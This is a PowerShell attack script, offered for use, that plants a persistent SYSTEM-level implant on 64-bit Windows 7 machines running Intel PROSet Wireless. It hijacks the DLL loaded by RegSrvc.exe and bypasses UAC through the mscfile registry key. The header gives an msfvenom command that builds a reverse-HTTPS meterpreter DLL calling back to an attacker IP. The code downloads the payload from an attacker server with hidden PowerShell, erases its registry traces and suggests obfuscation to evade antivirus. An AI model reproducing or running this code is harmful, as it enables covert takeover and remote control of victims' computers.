<#
Intel PROSet Wireless - Persistent SYSTEM Shell Implant (All Versions) (Win 7 - 64-bit)

Author: Fabrizio Siciliano (https://www.twitter.com/@0rbz_)
Date: 4/14/2017

Context: http://x42.obscurechannel.com/?p=378

Requirements: 
1. You have a previously acquired shell (through some other exploit) on a machine as a local admin user, and UAC is set to anything other than "Always Notify".

2. A 64-bit payload:
  - msfvenom -p windows/x64/meterpreter/reverse_https -f dll LHOST=attacker_ip LPORT=443 > RpcRtRemote.dll
  
3. A place to host your "RpcRtRemote.dll" payload that supports HTTPS (helps with AV heuristics).

4. Generate a proper meterpreter https listener resource file, with a custom SSL cert (AV's love custom 
   meterpreter certs): http://bit.ly/2odN6OV

Some bits of this code borrowed from @enigma0x3 (some UAC stuff...)

Takes a url to your "RpcRtRemote.dll" payload as an argument:

powershell.exe ./intel_inside.ps1 https://yourserver/RpcRtRemote.dll
#> 

param (   
    [string]$PsPayload = $(throw "--------------------------------------------------------------------------
** Usage:                                                               **
** powershell.exe ./intel_inside.ps1 https://yourserver/RpcRtRemote.dll **
--------------------------------------------------------------------------")
)
	$IntelInside = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"
	if(![System.IO.File]::Exists($IntelInside)){
	Echo "
[!] It doesn't look like the system is running Intel PROSet Wireless Software. Couldn't find 'RegSrvc.exe'. Quitting.
"
	exit
	}
	$IntelInside = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"
	if([System.IO.File]::Exists($IntelInside)){
	Echo "
[*] Found RegSrvc.exe! Make sure your listener is running."
	Start-Sleep -s 3
	Echo "[+] Checking UAC status."
	Start-Sleep -s 5
	}
	
	$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "[!] UAC is set to 'Always Notify', I can't help you."
        exit
		}
		
    else{
		Echo "[*] UAC Status OK and set to 'Default'."
		Start-Sleep -s 3
		Echo "[+] Setting up persistent implant and executing payload."
		
		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$LocalFile = "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"
		$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadFile('$PsPayload','$LocalFile')"
		
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass

		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		Start-Sleep -s 3
		
		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$RegValue = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"
		
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		
		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		Start-Sleep -s 5

		$MscRegCleanup = "HKCU:\Software\Classes\mscfile"
		Remove-Item -Path $MscRegCleanup -Force  -Recurse -ErrorAction SilentlyContinue | Out-Null
		
		$Implant = "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"
		if([System.IO.File]::Exists($Implant)){
			Echo "[*] Done! 'RpcRtRemote.dll' implant successful. Check your shell, run 'getsystem'."
			Echo "[*] Will persist across reboots and phone home as a SYSTEM shell before user login."
			Start-Sleep -s 3
			Echo '
[*] To uninstall:
	- taskkill.exe /IM RegSrvc.exe /F
	- del "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"'
		exit
		}
			else{
				Echo "[!] Something went horribly wrong and the implant was not installed. Possibly flagged by AV? Try an obfuscated payload."
			}
			exit
	}